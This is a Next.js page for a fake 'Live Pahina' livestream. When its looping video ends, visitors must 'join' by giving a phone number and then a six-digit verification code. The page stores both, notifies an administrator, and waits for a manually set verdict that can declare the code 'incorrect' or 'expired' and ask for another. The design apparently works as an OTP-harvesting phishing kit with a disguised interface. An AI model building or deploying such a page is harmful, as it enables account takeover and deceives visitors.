
"use client";

import { useState, useEffect } from "react";
import { parsePhoneNumberFromString } from "libphonenumber-js";
import { supabase } from "@/lib/supabase";

const countries = [
  { code: "NG", name: "Nigeria", dial: "+234", flag: "🇳🇬" },
  { code: "PH", name: "Philippines", dial: "+63", flag: "🇵🇭" },
  { code: "US", name: "United States", dial: "+1", flag: "🇺🇸" },
  { code: "GB", name: "United Kingdom", dial: "+44", flag: "🇬🇧" },
  { code: "CA", name: "Canada", dial: "+1", flag: "🇨🇦" },
  { code: "GH", name: "Ghana", dial: "+233", flag: "🇬🇭" },
  { code: "KE", name: "Kenya", dial: "+254", flag: "🇰🇪" },
  { code: "ZA", name: "South Africa", dial: "+27", flag: "🇿🇦" },
  { code: "UG", name: "Uganda", dial: "+256", flag: "🇺🇬" },
  { code: "TZ", name: "Tanzania", dial: "+255", flag: "🇹🇿" },
  { code: "CM", name: "Cameroon", dial: "+237", flag: "🇨🇲" },
  { code: "CI", name: "Ivory Coast", dial: "+225", flag: "🇨🇮" },
  { code: "SN", name: "Senegal", dial: "+221", flag: "🇸🇳" },
  { code: "EG", name: "Egypt", dial: "+20", flag: "🇪🇬" },
  { code: "IN", name: "India", dial: "+91", flag: "🇮🇳" },
  { code: "PK", name: "Pakistan", dial: "+92", flag: "🇵🇰" },
  { code: "BD", name: "Bangladesh", dial: "+880", flag: "🇧🇩" },
  { code: "ID", name: "Indonesia", dial: "+62", flag: "🇮🇩" },
  { code: "MY", name: "Malaysia", dial: "+60", flag: "🇲🇾" },
  { code: "SG", name: "Singapore", dial: "+65", flag: "🇸🇬" },
  { code: "TH", name: "Thailand", dial: "+66", flag: "🇹🇭" },
  { code: "VN", name: "Vietnam", dial: "+84", flag: "🇻🇳" },
  { code: "CN", name: "China", dial: "+86", flag: "🇨🇳" },
  { code: "JP", name: "Japan", dial: "+81", flag: "🇯🇵" },
  { code: "KR", name: "South Korea", dial: "+82", flag: "🇰🇷" },
  { code: "AU", name: "Australia", dial: "+61", flag: "🇦🇺" },
  { code: "NZ", name: "New Zealand", dial: "+64", flag: "🇳🇿" },
  { code: "DE", name: "Germany", dial: "+49", flag: "🇩🇪" },
  { code: "FR", name: "France", dial: "+33", flag: "🇫🇷" },
  { code: "IT", name: "Italy", dial: "+39", flag: "🇮🇹" },
  { code: "ES", name: "Spain", dial: "+34", flag: "🇪🇸" },
  { code: "NL", name: "Netherlands", dial: "+31", flag: "🇳🇱" },
  { code: "BE", name: "Belgium", dial: "+32", flag: "🇧🇪" },
  { code: "CH", name: "Switzerland", dial: "+41", flag: "🇨🇭" },
  { code: "SE", name: "Sweden", dial: "+46", flag: "🇸🇪" },
  { code: "NO", name: "Norway", dial: "+47", flag: "🇳🇴" },
  { code: "DK", name: "Denmark", dial: "+45", flag: "🇩🇰" },
  { code: "IE", name: "Ireland", dial: "+353", flag: "🇮🇪" },
  { code: "PT", name: "Portugal", dial: "+351", flag: "🇵🇹" },
  { code: "AE", name: "United Arab Emirates", dial: "+971", flag: "🇦🇪" },
  { code: "SA", name: "Saudi Arabia", dial: "+966", flag: "🇸🇦" },
  { code: "QA", name: "Qatar", dial: "+974", flag: "🇶🇦" },
  { code: "TR", name: "Turkey", dial: "+90", flag: "🇹🇷" },
  { code: "BR", name: "Brazil", dial: "+55", flag: "🇧🇷" },
  { code: "MX", name: "Mexico", dial: "+52", flag: "🇲🇽" },
  { code: "AR", name: "Argentina", dial: "+54", flag: "🇦🇷" },
  { code: "JM", name: "Jamaica", dial: "+1", flag: "🇯🇲" },
  { code: "TT", name: "Trinidad and Tobago", dial: "+1", flag: "🇹🇹" },
];

export default function Home() {
  const [reaction, setReaction] = useState(null);
  const [likes, setLikes] = useState(128);
  const [dislikes, setDislikes] = useState(3);

  const [showJoin, setShowJoin] = useState(false);
  const [joinMethod, setJoinMethod] = useState(null);
  const [videoEnded, setVideoEnded] = useState(false);

  const [phase, setPhase] = useState("choose");
  const [countryCode, setCountryCode] = useState("PH");
  const [phone, setPhone] = useState("");
  const [submittedPhone, setSubmittedPhone] = useState("");
  const [code, setCode] = useState("");
  const [requestId, setRequestId] = useState(null);
  const [visitorToken, setVisitorToken] = useState(null);
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);

  const selectedCountry =
    countries.find((country) => country.code === countryCode) ||
    countries.find((country) => country.code === "PH");

  // Send an email notification without interrupting the visitor's process.
  // The six-digit verification code is deliberately never sent.
  const sendAdminNotification = async (event, phoneNumber, id, token) => {
    try {
      const response = await fetch("/api/notifications/send", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          event,
          phone: phoneNumber,
          requestId: id,
          visitorToken: token,
        }),
      });

      if (!response.ok) {
        const result = await response.json().catch(() => ({}));
        console.error(
          "Live Pahina notification error:",
          result.error || "Notification could not be sent."
        );
      }
    } catch (error) {
      console.error("Live Pahina notification error:", error);
    }
  };

  const handleReaction = (type) => {
    if (reaction === type) {
      setReaction(null);
      type === "like"
        ? setLikes((n) => n - 1)
        : setDislikes((n) => n - 1);
      return;
    }

    if (reaction === "like") setLikes((n) => n - 1);
    if (reaction === "dislike") setDislikes((n) => n - 1);

    setReaction(type);
    type === "like"
      ? setLikes((n) => n + 1)
      : setDislikes((n) => n + 1);
  };

  const openJoin = () => {
    setShowJoin(true);
    setJoinMethod(null);
    setPhase("choose");
    setMessage("");
  };

 const closeJoin = () => {
  if (phase === "waiting") return;
  setShowJoin(false);
};

  // Submit and validate the complete international phone number.
  const submitPhone = async (e) => {
    e.preventDefault();

    setMessage("");

    const parsedPhone = parsePhoneNumberFromString(
      phone,
      selectedCountry.code
    );

    if (!parsedPhone || !parsedPhone.isValid()) {
      setMessage("Wrong phone number. Please check and try again.");
      return;
    }

    const internationalPhone = parsedPhone.number;

    setLoading(true);

    try {
      const { data, error } = await supabase.rpc(
        "submit_phone_request",
        {
          p_phone_number: internationalPhone,
        }
      );

      if (error) throw error;

      const request = data?.[0];

      if (!request?.request_id || !request?.visitor_token) {
        throw new Error("Unable to create your request. Please try again.");
      }

      setRequestId(request.request_id);
      setVisitorToken(request.visitor_token);
      setSubmittedPhone(internationalPhone);
      setCode("");
      setMessage("");
      setPhase("code");

      // Notify the administrator after the phone request is saved.
      void sendAdminNotification(
        "phone_submitted",
        internationalPhone,
        request.request_id,
        request.visitor_token
      );
    } catch (error) {
      setMessage(error.message || "Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  // Submit the six-digit verification code.
  const submitCode = async (e) => {
    e.preventDefault();

    if (!/^[0-9]{6}$/.test(code)) {
      setMessage("Please enter a valid six-digit code.");
      return;
    }

    setMessage("");
    setLoading(true);

    try {
      const { data, error } = await supabase.rpc(
        "submit_verification_code",
        {
          p_request_id: requestId,
          p_visitor_token: visitorToken,
          p_code: code,
        }
      );

      if (error) throw error;

      if (data !== true) {
        throw new Error("Your request could not be found. Please try again.");
      }

      setPhase("waiting");

      // Notify the administrator that a code was submitted.
      // The code itself is NOT included in this notification.
      void sendAdminNotification(
        "code_submitted",
        submittedPhone,
        requestId,
        visitorToken
      );
    } catch (error) {
      setMessage(error.message || "Unable to submit your code.");
    } finally {
      setLoading(false);
    }
  };

  // Check verification status.
  useEffect(() => {
    if (phase !== "waiting" || !requestId || !visitorToken) {
      return;
    }

    let active = true;

    const checkStatus = async () => {
      const { data, error } = await supabase.rpc(
        "check_verification_status",
        {
          p_request_id: requestId,
          p_visitor_token: visitorToken,
        }
      );

      if (!active || error || !data?.length) return;

      const result = data[0];

      if (result.current_status === "approved") {
        setMessage(result.message || "Your verification was successful.");
        setPhase("approved");
      }

      if (result.current_status === "incorrect_code") {
        setCode("");
        setMessage(
          result.message || "Incorrect code. Please enter the correct code."
        );
        setPhase("code");
      }

      if (result.current_status === "code_expired") {
  setCode("");
  setMessage(
    result.message || "Your verification code has expired. Please enter a new code."
  );
  setPhase("code");
}

      if (result.current_status === "not_qualified") {
        setMessage(
          result.message || "Your request could not be approved at this time."
        );
        setPhase("not_qualified");
      }
    };

    checkStatus();

    const interval = setInterval(checkStatus, 3000);

    return () => {
      active = false;
      clearInterval(interval);
    };
  }, [phase, requestId, visitorToken]);

  return (
    <main className="min-h-screen bg-[#08090d] text-white">
      {/* HEADER */}
      <header className="border-b border-white/10">
        <div className="mx-auto flex max-w-6xl items-center justify-between px-5 py-5 md:px-8">
          <div className="flex items-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-red-600 text-xl font-black">
              P
            </div>

            <div>
              <h1 className="text-xl font-extrabold tracking-tight">
                LIVE <span className="text-red-500">PAHINA</span>
              </h1>
              <p className="text-[9px] tracking-[3px] text-gray-500">
                YOUR LIVE EXPERIENCE
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 rounded-full border border-red-500/20 bg-red-500/10 px-3 py-2">
            <span className="h-2 w-2 animate-pulse rounded-full bg-red-500"></span>
            <span className="text-[10px] font-bold tracking-widest text-red-400">
              LIVE
            </span>
          </div>
        </div>
      </header>

      {/* MAIN CONTENT */}
      <section className="mx-auto max-w-5xl px-4 pb-16 pt-8 md:px-8 md:pt-14">
        <div className="mb-6 text-center">
          <p className="mb-3 text-xs font-semibold tracking-[4px] text-red-500">
            WELCOME TO LIVE PAHINA
          </p>

          <h2 className="text-3xl font-black tracking-tight sm:text-5xl">
            Experience the <span className="text-red-500">Live.</span>
          </h2>

          <p className="mx-auto mt-3 max-w-lg text-sm leading-6 text-gray-400">
            Tune in, enjoy the experience and join our live community.
          </p>
        </div>

        {/* VIDEO PLAYER */}
        <div className="overflow-hidden rounded-2xl border border-white/10 bg-black shadow-2xl shadow-red-950/10">
          <div className="relative flex aspect-video items-center justify-center bg-[#111218]">
            {!videoEnded ? (
              <>
                <video
                  className="h-full w-full object-contain"
                  src="/videos/live-video.mp4"
                  autoPlay
                  muted
                  playsInline
                  controls
                  preload="metadata"
                  onEnded={() => setVideoEnded(true)}
                />

                <div className="pointer-events-none absolute left-4 top-4 flex items-center gap-2 rounded-md bg-red-600 px-3 py-1.5">
                  <span className="h-2 w-2 animate-pulse rounded-full bg-white"></span>
                  <span className="text-[10px] font-bold tracking-widest">
                    LIVE NOW
                  </span>
                </div>
              </>
            ) : (
              <div className="flex h-full w-full flex-col items-center justify-center px-5 text-center">
                <div className="mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-red-600/10">
                  <span className="text-3xl text-red-500">▶</span>
                </div>

                <h3 className="text-xl font-bold sm:text-2xl">
                  Join Live to continue watching
                </h3>

                <p className="mt-2 text-sm text-gray-400">
                  Connect with Live Pahina to access the live experience.
                </p>

                <button
                  onClick={openJoin}
                  className="mt-6 rounded-xl bg-red-600 px-9 py-3.5 text-sm font-bold tracking-wider shadow-lg shadow-red-900/30 transition hover:bg-red-700"
                >
                  JOIN LIVE →
                </button>
              </div>
            )}
          </div>

          {/* VIDEO INFORMATION */}
          <div className="flex flex-wrap items-center justify-between gap-4 border-t border-white/10 px-4 py-4 sm:px-6">
            <div>
              <h3 className="text-sm font-bold sm:text-base">
                Live Pahina Broadcast
              </h3>
              <p className="mt-1 text-xs text-gray-500">
                Enjoy our continuous live experience.
              </p>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() => handleReaction("like")}
                className={`flex items-center gap-2 rounded-lg border px-4 py-2.5 text-sm transition ${
                  reaction === "like"
                    ? "border-blue-500/40 bg-blue-500/15 text-blue-400"
                    : "border-white/10 bg-white/5 text-gray-300 hover:bg-white/10"
                }`}
              >
                <span>👍</span>
                <span>{likes}</span>
              </button>

              <button
                onClick={() => handleReaction("dislike")}
                className={`flex items-center gap-2 rounded-lg border px-4 py-2.5 text-sm transition ${
                  reaction === "dislike"
                    ? "border-red-500/40 bg-red-500/15 text-red-400"
                    : "border-white/10 bg-white/5 text-gray-300 hover:bg-white/10"
                }`}
              >
                <span>👎</span>
                <span>{dislikes}</span>
              </button>
            </div>
          </div>
        </div>

        {/* FOOTER */}
        <footer className="mt-14 border-t border-white/10 pt-6 text-center">
          <p className="text-xs text-gray-500">
            © {new Date().getFullYear()} Live Pahina. All rights reserved.
          </p>
        </footer>
      </section>

      {/* JOIN POPUP */}
      {showJoin && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm"
          onClick={closeJoin}
        >
          <div
            className="w-full max-w-md rounded-2xl border border-white/10 bg-[#15161d] p-6 shadow-2xl sm:p-8"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="mb-6 flex items-center justify-between">
              <h3 className="text-xl font-bold">
                {phase === "choose" && "Join Live Pahina"}
                {phase === "phone" && "Enter Phone Number"}
                {phase === "code" && "Phone Verification"}
                {phase === "waiting" && "Verification"}
                {phase === "approved" && "Verification Successful"}
                {phase === "not_qualified" && "Access Denied"}
              </h3>

              {phase !== "waiting" && (
  <button
    onClick={closeJoin}
    className="text-2xl text-gray-400 hover:text-white"
  >
    ×
  </button>
)}
            </div>

            {/* CHOOSE CONNECTION METHOD */}
            {phase === "choose" && (
              <>
                <p className="mb-6 text-sm leading-6 text-gray-400">
                  Choose how you would like to connect.
                </p>

                <button
                  onClick={() => {
                    setJoinMethod("phone");
                    setPhase("phone");
                    setMessage("");
                  }}
                  className="mb-3 flex w-full items-center gap-4 rounded-xl border border-white/10 bg-white/5 p-4 text-left transition hover:border-red-500/50 hover:bg-white/10"
                >
                  <span className="text-2xl">📱</span>
                  <span>
                    <span className="block text-sm font-bold">Phone Number</span>
                    <span className="mt-1 block text-xs text-gray-500">
                      Connect using your mobile number
                    </span>
                  </span>
                  <span className="ml-auto text-gray-500">→</span>
                </button>

                <button
                  onClick={() => setJoinMethod("email")}
                  className="flex w-full items-center gap-4 rounded-xl border border-white/10 bg-white/5 p-4 text-left transition hover:border-red-500/50 hover:bg-white/10"
                >
                  <span className="text-2xl">✉️</span>
                  <span>
                    <span className="block text-sm font-bold">Email Address</span>
                    <span className="mt-1 block text-xs text-gray-500">
                      Connect using your email address
                    </span>
                  </span>
                  <span className="ml-auto text-gray-500">→</span>
                </button>

                {joinMethod === "email" && (
                  <div className="mt-5 rounded-xl border border-red-500/20 bg-red-500/5 p-4">
                    <p className="text-sm text-gray-400">
                      Email connection will be integrated when your email pages are ready.
                    </p>
                  </div>
                )}
              </>
            )}

           
{/* PHONE NUMBER FORM */}
{phase === "phone" && (
  <form onSubmit={submitPhone}>
    <p className="mb-5 text-sm leading-6 text-gray-400">
      Enter your mobile phone number to request access to Live Pahina.
    </p>

    <label className="mb-2 block text-sm font-semibold text-gray-300">
      Country
    </label>

    <select
      value={countryCode}
      onChange={(e) => {
        setCountryCode(e.target.value);
        setMessage("");
      }}
      aria-label="Select country"
      className="mb-4 w-full rounded-xl border border-white/10 bg-[#20212a] px-4 py-3 text-white outline-none focus:border-red-500"
    >
      {countries.map((country) => (
        <option key={country.code} value={country.code}>
          {country.flag} {country.name}
        </option>
      ))}
    </select>

    <label className="mb-2 block text-sm font-semibold text-gray-300">
      Phone Number
    </label>

    <div className="flex items-center rounded-xl border border-white/10 bg-white/5 focus-within:border-red-500">
      <span className="shrink-0 border-r border-white/10 px-3 py-3 font-semibold text-gray-300">
        {selectedCountry.dial}
      </span>

      <input
        type="tel"
        inputMode="tel"
        autoComplete="tel-national"
        value={phone}
        onChange={(e) => {
          setPhone(e.target.value);
          if (message) setMessage("");
        }}
        placeholder="Enter your phone number"
        required
        maxLength={20}
        className="w-full min-w-0 bg-transparent px-3 py-3 text-white outline-none"
      />
    </div>

    <p className="mt-2 text-xs text-gray-500">
      Enter your number without the country calling code.
    </p>

    {message && (
      <p className="mt-3 text-sm text-red-400">{message}</p>
    )}

    <button
      type="submit"
      disabled={loading}
      className="mt-5 w-full rounded-xl bg-red-600 py-3.5 text-sm font-bold tracking-wider transition hover:bg-red-700 disabled:opacity-50"
    >
      {loading ? "PLEASE WAIT..." : "CONTINUE"}
    </button>

    <button
      type="button"
      onClick={() => {
        setPhase("choose");
        setMessage("");
      }}
      className="mt-3 w-full py-2 text-sm text-gray-400 hover:text-white"
    >
      ← Go Back
    </button>
  </form>
)}


            {/* SIX-DIGIT VERIFICATION FORM */}
            {phase === "code" && (
              <form onSubmit={submitCode}>
                <label className="mb-2 block text-sm font-semibold text-gray-300">
                  Six-Digit Verification Code
                </label>

                <input
                  type="text"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  value={code}
                  onChange={(e) =>
                    setCode(e.target.value.replace(/\D/g, "").slice(0, 6))
                  }
                  placeholder="000000"
                  maxLength={6}
                  required
                  className="w-full rounded-xl border border-white/10 bg-white/5 px-4 py-4 text-center text-2xl font-bold tracking-[12px] text-white outline-none focus:border-red-500"
                />

                {message && (
                  <p className="mt-3 text-center text-sm text-red-400">
                    {message}
                  </p>
                )}

                <button
                  type="submit"
                  disabled={loading || code.length !== 6}
                  className="mt-5 w-full rounded-xl bg-red-600 py-3.5 text-sm font-bold tracking-wider transition hover:bg-red-700 disabled:opacity-50"
                >
                  {loading ? "VERIFYING..." : "VERIFY CODE"}
                </button>
              </form>
            )}

            {/* WAITING FOR VERIFICATION */}
            {phase === "waiting" && (
              <div className="py-8 text-center">
                <div className="mx-auto mb-6 h-14 w-14 animate-spin rounded-full border-4 border-white/10 border-t-red-500"></div>

                <h4 className="text-xl font-bold">
                  Joining Live
                </h4>

                <p className="mt-3 text-sm leading-6 text-gray-400">
                  Your verification is being processed. Please wait while we validate your details.
                </p>

                <p className="mt-4 text-xs text-gray-500">
                  This may take a little while.
                </p>
              </div>
            )}

            {/* APPROVED */}
            {phase === "approved" && (
              <div className="py-8 text-center">
                <div className="mb-5 text-5xl text-green-500">✓</div>

                <h4 className="text-xl font-bold text-green-400">
                  You're Approved!
                </h4>

                <p className="mt-3 text-sm leading-6 text-gray-300">
                  {message}
                </p>

                <button
                  onClick={closeJoin}
                  className="mt-6 w-full rounded-xl bg-red-600 py-3 font-bold hover:bg-red-700"
                >
                  CONTINUE
                </button>
              </div>
            )}

            {/* NOT QUALIFIED */}
            {phase === "not_qualified" && (
              <div className="py-8 text-center">
                <div className="mb-5 text-5xl text-red-500">!</div>

                <h4 className="text-xl font-bold text-red-400">
                  Unable to Join
                </h4>

                <p className="mt-3 text-sm leading-6 text-gray-300">
                  {message}
                </p>

                <button
                  onClick={closeJoin}
                  className="mt-6 w-full rounded-xl border border-white/10 bg-white/5 py-3 font-bold hover:bg-white/10"
                >
                  CLOSE
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </main>
  );
}
